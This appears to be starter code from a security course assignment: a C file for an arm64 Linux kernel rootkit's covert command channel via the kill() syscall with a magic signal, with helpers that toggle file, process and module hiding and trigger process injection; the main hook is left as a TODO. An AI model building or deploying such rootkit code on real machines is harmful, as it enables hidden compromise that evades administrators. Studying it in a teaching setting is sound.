/*
 * c2.c: covert C2 channel via the kill() syscall
 *
 * This is a sample implementation. You are welcome to communicate with
 * your rootkit however you want: different signal, /proc entry, ioctl
 * on a hijacked device, whatever. The rubric only requires that the
 * channel has no obvious filesystem or network artifact.
 *
 * This implementation: when signal == MAGIC_SIGNAL (62), interpret the
 * call as a rootkit command and swallow it so the caller sees success
 * instead of a delivered signal.
 *
 * The kill syscall is an __arm64_sys_* wrapper: the real registers are
 * one level of indirection away (double pt_regs, same pattern as HW4).
 *
 * Toggle commands must be deferred: (un)registering hooks cannot happen
 * from inside a hook handler. Use schedule_toggle / schedule_inject /
 * schedule_add_gid below. CMD_TOGGLE_BLOCK is safe to handle directly
 * (it is just a flag flip, no hook registration involved).
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/workqueue.h>
#include <asm/ptrace.h>

#include "rootkit.h"

/* ─── External state (defined in rootkit.c) ───────────────────────────────── */

extern int  blocking_init(void);
extern void blocking_exit(void);
extern bool blocking_active;
extern void hide_module(void);
extern void show_module(void);

/* ─── Deferred injection (can't call vm_mmap from kprobe context) ────────── */

struct inject_work {
	struct work_struct work;
	pid_t target;
};

static void inject_work_fn(struct work_struct *w)
{
	struct inject_work *iw = container_of(w, struct inject_work, work);
	inject_trigger(iw->target);
	kfree(iw);
}

struct gid_work {
	struct work_struct work;
	pid_t target;
};

static void gid_work_fn(struct work_struct *w)
{
	struct gid_work *gw = container_of(w, struct gid_work, work);
	proc_hide_add_pid(gw->target);
	kfree(gw);
}

static void schedule_add_gid(pid_t target)
{
	struct gid_work *gw = kmalloc(sizeof(*gw), GFP_ATOMIC);
	if (!gw)
		return;
	INIT_WORK(&gw->work, gid_work_fn);
	gw->target = target;
	schedule_work(&gw->work);
}

/* Toggle commands need to (un)register kprobes/kretprobes which can sleep,
 * so they can't run from kprobe context. Defer to a workqueue. */
struct toggle_work {
	struct work_struct work;
	int cmd;
};

static void toggle_work_fn(struct work_struct *w)
{
	struct toggle_work *tw = container_of(w, struct toggle_work, work);

	switch (tw->cmd) {
	case CMD_TOGGLE_HIDE:
		if (file_hide_is_active()) {
			file_hide_disable();
			pr_info("rootkit: file hiding OFF\n");
		} else {
			file_hide_enable();
			pr_info("rootkit: file hiding ON\n");
		}
		break;
	case CMD_TOGGLE_PROC:
		if (proc_hide_is_active()) {
			proc_hide_disable();
			pr_info("rootkit: process hiding OFF\n");
		} else {
			proc_hide_enable();
			pr_info("rootkit: process hiding ON\n");
		}
		break;
	case CMD_TOGGLE_MODULE:
		show_module();
		pr_info("rootkit: module unhidden\n");
		break;
	}
	kfree(tw);
}

static void schedule_toggle(int cmd)
{
	struct toggle_work *tw = kmalloc(sizeof(*tw), GFP_ATOMIC);
	if (!tw)
		return;
	INIT_WORK(&tw->work, toggle_work_fn);
	tw->cmd = cmd;
	schedule_work(&tw->work);
}

static void schedule_inject(pid_t target)
{
	struct inject_work *iw = kmalloc(sizeof(*iw), GFP_ATOMIC);
	if (!iw)
		return;
	INIT_WORK(&iw->work, inject_work_fn);
	iw->target = target;
	schedule_work(&iw->work);
}


static bool active;

int c2_init(void)
{
	/* TODO */
	return -ENOSYS;
}

void c2_exit(void)
{
}
